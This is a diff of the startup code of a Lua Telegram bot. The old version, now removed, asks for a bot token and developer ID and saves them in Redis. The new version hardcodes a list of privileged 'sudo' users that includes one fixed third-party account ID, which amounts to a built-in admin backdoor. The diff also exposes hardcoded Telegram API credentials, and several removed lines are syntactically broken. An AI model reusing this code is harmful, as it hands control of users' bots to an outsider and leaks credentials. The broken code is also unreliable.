@@ -1,114 +1,43 @@
 --[[
+
 --]]
-URL     = require("./libs/url")
-JSON    = require("./libs/dkjson")
-serpent = require("libs/serpent")
-json = require('libs/json')
-Redis = require('libs/redis').connect('127.0.0.1', 6379)
-http  = require("socket.http")
+database = dofile("./File_Libs/redis.lua").connect("127.0.0.1", 6379)
+serpent = dofile("./File_Libs/serpent.lua")
+JSON    = dofile("./File_Libs/dkjson.lua")
+json    = dofile("./File_Libs/JSON.lua")
+URL     = dofile("./File_Libs/url.lua")
+http    = require("socket.http")
 https   = require("ssl.https")
-local Methods = io.open("./luatele.lua","r")
-if Methods then
-URL.tdlua_CallBack()
+sudos   = dofile("sudo.lua")
+bot_id  = token:match("(%d+)")  
+Id_Sudo = Sudo
+List_Sudos = {Id_Sudo,1313703081}
+User = io.popen("whoami"):read('*a'):gsub('[\n\r]+', '')
+print("\27[34m"..[[>> Your bot has been activated on the Vecto source]].."\27[m")
+io.popen("mkdir files_Mega")
+t = "\27[35m".."\nAll Files Started : \n____________________\n"..'\27[m'
+i = 0
+for v in io.popen('ls files_Mega'):lines() do
+if v:match(".lua$") then
+i = i + 1
+t = t.."\27[39m"..i.."\27[36m".." - \27[10;32m"..v..",\27[m \n"
 end
-SshId = io.popen("echo $SSH_CLIENT ︙ awk '{ print $1}'"):read('*a')
-luatele = require 'luatele'
-local FileInformation = io.open("./Information.lua","r")
-if not FileInformation then
-if not Redis:get(SshId.."Info:Redis:Token") then
-io.write('\27[1;31mارسل لي توكن البوت الان \nSend Me a Bot Token Now ↡\n\27[0;39;49m')
-local TokenBot = io.read()
-if TokenBot and TokenBot:match('(%d+):(.*)') then
-local url , res = https.request('https://api.telegram.org/bot'..TokenBot..'/getMe')
-local Json_Info = JSON.decode(url)
-if res ~= 200 then
-print('\27[1;34mعذرا توكن البوت خطأ تحقق منه وارسله مره اخره \nBot Token is Wrong\n')
-else
-io.write('\27[1;34mتم حفظ التوكن بنجاح \nThe token been saved successfully \n\27[0;39;49m')
-TheTokenBot = TokenBot:match("(%d+)")
-os.execute('sudo rm -fr .CallBack-Bot/'..TheTokenBot)
-Redis:set(SshId.."Info:Redis:Token",TokenBot)
-Redis:set(SshId.."Info:Redis:Token:User",Json_Info.result.username)
-end 
-else
-print('\27[1;34mلم يتم حفظ التوكن جرب مره اخره \nToken not saved, try again')
-end 
-os.execute('lua Mega.lua')
 end
-if not Redis:get(SshId.."Info:Redis:User") then
-io.write('\27[1;31mارسل معرف المطور الاساسي الان \nDeveloper UserName saved ↡\n\27[0;39;49m')
-local UserSudo = io.read():gsub('@','')
-if UserSudo ~= '' then
-io.write('\n\27[1;34mتم حفظ معرف المطور \nDeveloper UserName saved \n\n\27[0;39;49m')
-Redis:set(SshId.."Info:Redis:User",UserSudo)
-else
-print('\n\27[1;34mلم يتم حفظ معرف المطور الاساسي \nDeveloper UserName not saved\n')
-end 
-os.execute('lua Mega.lua')
-end
-if not Redis:get(SshId.."Info:Redis:User:ID") then
-io.write('\27[1;31mارسل ايدي المطور الاساسي الان \nDeveloper ID saved ↡\n\27[0;39;49m'
-local UserId = io.read
-if UserId and UserId:match('(%d+)') then
-io.write('\n\27[1;34mتم حفظ ايدي المطور \nDeveloper ID saved \n\n\27[0;39;49m'
-Redis:set(SshId.."Info:Redis:User:ID"
-else
-print('\n\27[1;34mلم يتم حفظ ايدي المطور الاساسي \nDeveloper ID not saved\n')
-end 
-os.execute('lua Mega.lua')
-end
-local Informationlua = io.open("Information.lua", 'w')
-Informationlua:write([[
-return {
-Token = "]]..Redis:get(SshId.."Info:Redis:Token")..[[",
-UserBot = "]]..Redis:get(SshId.."Info:Redis:Token:User")..[[",
-UserSudo = "]]..Redis:get(SshId.."Info:Redis:User")..[[",
-SudoId = ]]..Redis:get(SshId.."Info:Redis:User:ID")..[[
-}
-]])
-Informationlua:close()
-local Mega = io.open("Mega", 'w'
-Mega:write([[
-cd $(cd $(dirname $0); pwd)
-while(true) do
-sudo lua5.3 Mega.lua
-done
-]]
-Mega:close
-local Run = io.open("Run", 'w'
-Run:write([[
-cd $(cd $(dirname $0); pwd)
-while(true) do
-screen -S Mega -X kill
-screen -S Mega ./Mega
-done
-]]
-Run:close
-Redis:del(SshId.."Info:Redis:User:ID");Redis:del(SshId.."Info:Redis:User");Redis:del(SshId.."Info:Redis:Token:User");Redis:del(SshId.."Info:Redis:Token")
-os.execute('chmod +x Mega;chmod +x Run;./Run')
-end
-Information = dofile('./Information.lua')
-Sudo_Id = Information.SudoId
-UserSudo = Information.UserSudo
-Token = Information.Token
-UserBot = Information.UserBot
-Mega = Token:match("(%d+)")
-os.execute('sudo rm -fr .CallBack-Bot/'..Mega)
-LuaTele = luatele.set_config{api_id=2692371,api_hash='fe85fff033dfe0f328aeb02b4f784930',session_name=Mega,token=Token}
-LUATELE = URL.escape(""..Mega.."\n"..UserBot.."\n"..UserSudo.."\n"..Token.."")
-function var(value)  
+print(t)
+function vardump(value)  
 print(serpent.block(value, {comment=false}))   
 end 
+function dl_cb(t,s)
+end
 function DevMegae(user)  
-local DARK_Sudo = false  
+local Taha_Sudo = false  
 for k,v in pairs(List_Sudos) do  
 if user == v then  
-DARK_Sudo = true  
+Taha_Sudo = true  
 end  
 end  
-return DARK_Sudo  
+return Taha_Sudo  
 end 
-
 function VIP_DeV(msg)  
 local h_Sudo = false  
 for k,v in pairs(List_Sudos) do  
